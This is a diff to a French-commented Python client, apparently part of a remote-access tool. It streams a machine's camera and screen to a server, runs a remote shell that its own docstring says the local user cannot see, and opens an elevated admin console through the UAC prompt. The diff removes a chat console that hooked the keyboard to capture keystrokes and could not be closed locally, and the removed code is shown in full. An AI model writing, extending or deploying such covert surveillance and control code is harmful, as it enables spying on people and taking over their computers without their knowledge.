@@ -1,5 +1,5 @@
 """
-Client caméra / écran / shell / chat — se connecte au serveur par HTTP,
+Client caméra / écran / shell — se connecte au serveur par HTTP,
 depuis n'importe quel réseau Wi-Fi.
 
 Fonctionnalités (toutes indépendantes) :
@@ -12,12 +12,8 @@ Fonctionnalités (toutes indépendantes) :
     L'utilisateur du client ne la voit pas. Seul server_gui y écrit.
   - CMD Commandes ADMIN : idem, mais via le popup UAC natif de Windows.
     La console tourne avec les droits admin. Sur Linux : indisponible.
-  - Chat : vraie console cmd.exe VISIBLE chez le client, avec capture des
-    frappes via hook clavier (Solution B — préfixe invisible). Le [X] est
-    neutralisé ; seul server_gui peut fermer la console.
 
-Compatible Windows et Linux (le chat et le CMD admin ne sont actifs que
-sous Windows).
+Compatible Windows et Linux (le CMD admin n'est actif que sous Windows).
 
 CORRECTIFS v9 :
   - Ajout du CMD Admin (UAC Windows + pont socket localhost).
@@ -25,6 +21,7 @@ CORRECTIFS v9 :
   - Bifurcation --admin-bridge au tout début de main() : indispensable
     pour que le pont élevé fonctionne aussi dans un .exe PyInstaller
     (sys.executable = CameraClient.exe, on relance le même exe).
+  - Suppression complète du Chat (console visible + hook clavier).
 """
 
 import argparse
@@ -66,13 +63,6 @@ try:
     from embedded_config import SERVER_URL as EMBEDDED_SERVER_URL
 except ImportError:
     EMBEDDED_SERVER_URL = ""
-
-try:
-    from console_windows import ChatConsole
-    _HAS_CHAT_CONSOLE = platform.system() == "Windows"
-except ImportError:
-    ChatConsole = None
-    _HAS_CHAT_CONSOLE = False
 
 try:
     from console_admin_windows import RemoteAdminConsole
@@ -649,13 +639,6 @@ class CameraClient:
         if _HAS_ADMIN_CONSOLE:
             self._admin_console = RemoteAdminConsole(server_url, device_id)
 
-        self._chat_console: "ChatConsole | None" = None
-        if _HAS_CHAT_CONSOLE:
-            self._chat_console = ChatConsole(
-                title="Chat distant",
-                on_user_input=self._handle_user_chat,
-            )
-
     def run_forever(self) -> None:
         logger.info(
             "Démarrage du client — serveur : %s — appareil : %s (%s)",
@@ -681,11 +664,6 @@ class CameraClient:
         self._remote_console.stop()
         if self._admin_console is not None:
             self._admin_console.stop()
-        if self._chat_console is not None:
-            try:
-                self._chat_console.close()
-            except Exception as exc:
-                logger.warning("Erreur lors de la fermeture de la console chat : %s", exc)
 
     def _check_commands(self) -> None:
         if self._location_process is not None and self._location_process.poll() is not None:
@@ -698,7 +676,6 @@ class CameraClient:
                 "device_id": self.device_id,
                 "name": self.device_name,
                 "location_open": "1" if self.location_open else "0",
-                "chat_window_open": "1" if self._chat_window_is_open() else "0",
                 "cmd_console_open": "1" if self._remote_console.is_running() else "0",
                 "admin_console_open": "1" if (
                     self._admin_console is not None and self._admin_console.is_running()
@@ -759,57 +736,6 @@ class CameraClient:
         admin_input = commands.get("shell_admin_input")
         if admin_input and self._admin_console is not None and self._admin_console.is_running():
             self._admin_console.write_command(admin_input.get("text", ""))
-
-        chat_window_cmd = commands.get("chat_window")
-        if self._chat_console is not None:
-            try:
-                if chat_window_cmd == "OPEN" and not self._chat_console.is_open():
-                    self._chat_console.open()
-                elif chat_window_cmd == "CLOSE" and self._chat_console.is_open():
-                    self._chat_console.close()
-            except Exception as exc:
-                logger.exception("Erreur lors de la gestion de la console chat : %s", exc)
-
-        chat_msg = commands.get("chat_message")
-        if chat_msg and self._chat_console is not None:
-            try:
-                if self._chat_console.is_open():
-                    self._chat_console.show_incoming(chat_msg.get("message", ""))
-            except Exception as exc:
-                logger.exception("Erreur lors de l'injection du message chat : %s", exc)
-
-    def _handle_user_chat(self, line: str) -> None:
-        try:
-            if self._chat_console is not None and self._chat_console.is_open():
-                safe = (
-                    line.replace("^", "^^")
-                    .replace("&", "^&")
-                    .replace("|", "^|")
-                    .replace("<", "^<")
-                    .replace(">", "^>")
-                    .replace('"', "'")
-                )
-                self._chat_console._send_text(f"echo Toi: {safe}\r")
-        except Exception as exc:
-            logger.exception("Erreur lors de l'affichage local du message chat : %s", exc)
-
-        try:
-            requests.post(
-                f"{self.server_url}/api/shell/result",
-                json={
-                    "device_id": self.device_id,
-                    "type": "chat",
-                    "message": line[:4000],
-                },
-                timeout=REQUEST_TIMEOUT,
-            )
-        except requests.RequestException:
-            pass
-        except Exception as exc:
-            logger.exception("Erreur lors de l'envoi du message chat : %s", exc)
-
-    def _chat_window_is_open(self) -> bool:
-        return self._chat_console is not None and self._chat_console.is_open()
 
     # ------------------------------------------------------------------
     # Flux caméra
@@ -1199,8 +1125,7 @@ def main() -> None:
     # Mode « pont élevé » : on a été relancé par console_admin_windows.py
     # via ShellExecuteW(..., "runas", ...) en tant que CameraClient.exe
     # --admin-bridge <token> <port>. On bifurque immédiatement vers le
-    # code du wrapper, sans rien initialiser d'autre (pas de config,
-    # pas de logging, pas de boucle client).
+    # code du wrapper, sans rien initialiser d'autre.
     if _admin_bridge is not None and _admin_bridge.is_bridge_invocation():
         sys.exit(_admin_bridge.main(sys.argv[1:]))
 
